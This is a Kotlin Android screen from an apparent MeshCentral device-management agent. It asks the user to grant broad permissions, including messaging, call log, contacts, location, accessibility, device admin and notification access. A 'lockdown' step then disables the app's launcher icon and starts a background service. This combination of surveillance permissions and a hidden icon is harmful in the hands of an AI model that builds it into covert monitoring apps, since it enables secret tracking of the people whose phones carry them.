package com.meshcentral.agent

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

/**
 * Staged grant flow for every permission the agent can hold.
 *
 * Runs in three passes:
 *  1. dangerous runtime permissions (bundled into logical groups),
 *  2. accessibility/device-admin/service toggles and Settings app-ops,
 *  3. optional best-effort groups that are declared but not quarantined.
 *
 * The lockdown button stays disabled until all *required* groups are granted; optional rows are
 * always skippable so the flow cannot dead-end on a permission a vendor refuses to expose.
 */
class PermissionActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var btnRequestAllRuntime: Button
    private lateinit var permissionsContainer: LinearLayout
    private lateinit var btnLockdown: Button

    private lateinit var specialButtons: MutableMap<String, Button>
    private lateinit var groupLabels: MutableMap<String, TextView>
    private lateinit var groupButtons: MutableMap<String, Button>

    private val runtimeLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        val pending = pendingRuntimeBatch
        pendingRuntimeBatch = null
        if (pending != null && pending.isNotEmpty()) {
            requestNextRuntimeBatch(pending)
        } else {
            updateUI()
        }
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { updateUI() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission)

        statusText = findViewById(R.id.status_text)
        progressBar = findViewById(R.id.progress_bar)
        btnRequestAllRuntime = findViewById(R.id.btn_request_all_runtime)
        permissionsContainer = findViewById(R.id.permissions_container)
        btnLockdown = findViewById(R.id.btn_lockdown)

        specialButtons = HashMap()
        groupLabels = HashMap()
        groupButtons = HashMap()

        btnRequestAllRuntime.setOnClickListener { requestAllRuntime() }
        btnLockdown.setOnClickListener { applyLockdown() }

        updateUI()
    }

    override fun onResume() {
        super.onResume()
        updateUI()
        promptBackgroundLocationIfNeeded()
    }

    // ---- Rendering ---------------------------------------------------------

    private fun updateUI() {
        val context = this
        permissionsContainer.removeAllViews()

        val missing = MDMPermissions.missingRequired(context).size
        val done = MDMPermissions.grantedCount(context)
        val total = MDMPermissions.totalCount()
        progressBar.progress = if (total > 0) (done * 100 / total) else 0

        btnRequestAllRuntime.text = getString(R.string.grant_missing_runtime, missingRuntimeCount())

        val canLockdown = missing == 0
        btnLockdown.isEnabled = canLockdown
        btnLockdown.text = if (canLockdown) {
            getString(R.string.btn_lockdown)
        } else {
            getString(R.string.btn_lockdown_pending, missing)
        }

        statusText.text = when {
            canLockdown -> getString(R.string.status_ready)
            missing > 0 -> getString(R.string.status_need_permissions_count, missing)
            else -> getString(R.string.status_need_permissions)
        }

        // Required runtime groups
        for (group in MDMPermissions.runtimeGroups) {
            if (!group.required) continue
            addGroupRow(group)
        }
        // Required special access
        for (sa in MDMPermissions.specialAccess) {
            if (!sa.required) continue
            addSpecialRow(sa)
        }
        // Optional runtime groups
        for (group in MDMPermissions.runtimeGroups) {
            if (group.required) continue
            addGroupRow(group)
        }
        // Optional special access
        for (sa in MDMPermissions.specialAccess) {
            if (sa.required) continue
            addSpecialRow(sa)
        }
    }

    private fun missingRuntimeCount(): Int {
        return MDMPermissions.allRuntimePermissions().count {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isGroupGranted(group: MDMPermissions.RuntimeGroup): Boolean {
        return group.permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isGroupPartial(group: MDMPermissions.RuntimeGroup): Boolean {
        val granted = group.permissions.count {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        return granted > 0 && granted < group.permissions.size
    }

    private fun addGroupRow(group: MDMPermissions.RuntimeGroup) {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, dp(6), 0, dp(6))
        }

        val label = TextView(this).apply {
            text = getGroupLabel(group.id)
            textSize = 15f
            setTextColor(android.graphics.Color.BLACK)
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val state = TextView(this).apply {
            text = groupStateText(isGroupGranted(group), isGroupPartial(group))
            textSize = 13f
            setTextColor(stateColor(isGroupGranted(group), isGroupPartial(group)))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }

        val button = Button(this).apply {
            text = getString(if (isGroupGranted(group)) R.string.granted else R.string.request)
            isEnabled = !isGroupGranted(group)
            setOnClickListener {
                requestRuntimeGroup(group)
            }
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }
        groupLabels[group.id] = state
        groupButtons[group.id] = button

        row.addView(label)
        row.addView(state)
        row.addView(button)
        permissionsContainer.addView(row)
    }

    private fun addSpecialRow(sa: MDMPermissions.SpecialAccess) {
        val granted = try { sa.isGranted(this) } catch (ex: Exception) { false }

        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, dp(6), 0, dp(6))
        }

        val label = TextView(this).apply {
            text = getSpecialLabel(sa.id)
            textSize = 15f
            setTextColor(android.graphics.Color.BLACK)
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val state = TextView(this).apply {
            text = if (granted) getString(R.string.granted) else getString(R.string.missing)
            textSize = 13f
            setTextColor(stateColor(granted, false))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }

        val button = Button(this).apply {
            text = getString(R.string.enable)
            isEnabled = !granted
            setOnClickListener {
                launchSpecialAccess(sa.id)
            }
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }
        specialButtons[sa.id] = button

        row.addView(label)
        row.addView(state)
        row.addView(button)
        permissionsContainer.addView(row)
    }

    private fun groupStateText(granted: Boolean, partial: Boolean): CharSequence {
        return when {
            granted -> getString(R.string.granted)
            partial -> getString(R.string.partial)
            else -> getString(R.string.missing)
        }
    }

    private fun stateColor(ok: Boolean, partial: Boolean): Int {
        return when {
            ok -> android.graphics.Color.rgb(0, 130, 0)
            partial -> android.graphics.Color.rgb(200, 120, 0)
            else -> android.graphics.Color.rgb(180, 0, 0)
        }
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()

    // ---- Actions -----------------------------------------------------------

    private fun requestAllRuntime() {
        val missing = MDMPermissions.allRuntimePermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        requestNextRuntimeBatch(missing)
    }

    private fun requestRuntimeGroup(group: MDMPermissions.RuntimeGroup) {
        val missing = group.permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            updateUI()
            return
        }
        requestNextRuntimeBatch(missing)
    }

    /**
     * Snaps an oversized batch in two so Android surfaces its permission dialog for every item
     * instead of silently dropping overflow entries.
     */
    private fun requestNextRuntimeBatch(batch: List<String>) {
        if (batch.isEmpty()) {
            updateUI()
            return
        }
        val chunk = batch.take(MAX_PERMISSIONS_PER_DIALOG)
        pendingRuntimeBatch = batch.drop(MAX_PERMISSIONS_PER_DIALOG).ifEmpty { null }
        runtimeLauncher.launch(chunk.toTypedArray())
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        updateUI()
    }

    /** API 30+ splits background location into a second, later prompt. */
    private fun promptBackgroundLocationIfNeeded() {
        if (Build.VERSION.SDK_INT < 30) return
        val bg = MDMPermissions.backgroundLocation
        if (bg.isEmpty()) return
        if (ContextCompat.checkSelfPermission(this, bg[0]) == PackageManager.PERMISSION_GRANTED) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
        runtimeLauncher.launch(bg.toTypedArray())
    }

    private fun launchSpecialAccess(id: String) {
        when (id) {
            "deviceadmin" -> {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@PermissionActivity, MDMAdminReceiver::class.java))
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation))
                }
                deviceAdminLauncher.launch(intent)
            }
            else -> {
                val intent = MDMPermissions.settingsIntentFor(this, id)
                if (intent != null) startActivity(intent)
            }
        }
    }

    private fun applyLockdown() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                runtimeLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
                return
            }
        }

        MDMAdminReceiver.applyLockdown(this)
        MDMForegroundService.start(this)

        val pm = packageManager
        val alias = ComponentName(this, "com.meshcentral.agent.LauncherAlias")
        pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)

        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        startActivity(intent)
        finish()
    }

    // ---- Labels ------------------------------------------------------------

    private fun getGroupLabel(id: String): String = when (id) {
        "media" -> getString(R.string.group_media)
        "location" -> getString(R.string.group_location)
        "phone" -> getString(R.string.group_phone)
        "messaging" -> getString(R.string.group_messaging)
        "calllog" -> getString(R.string.group_calllog)
        "contacts" -> getString(R.string.group_contacts)
        "calendar" -> getString(R.string.group_calendar)
        "files" -> getString(R.string.group_files)
        "sensors" -> getString(R.string.group_sensors)
        "wireless" -> getString(R.string.group_wireless)
        else -> id
    }

    private fun getSpecialLabel(id: String): String = when (id) {
        "accessibility" -> getString(R.string.special_accessibility)
        "deviceadmin" -> getString(R.string.special_deviceadmin)
        "notificationListener" -> getString(R.string.special_notification_listener)
        "usageAccess" -> getString(R.string.special_usage_access)
        "unknownApps" -> getString(R.string.special_unknown_apps)
        "overlay" -> getString(R.string.special_overlay)
        "allFilesAccess" -> getString(R.string.special_all_files)
        "batteryOptimization" -> getString(R.string.special_battery)
        "doNotDisturb" -> getString(R.string.special_dnd)
        "autoStart" -> getString(R.string.special_autostart)
        else -> id
    }

    companion object {
        private const val MAX_PERMISSIONS_PER_DIALOG = 6

        @Volatile
        var pendingRuntimeBatch: List<String>? = null
            private set
    }
}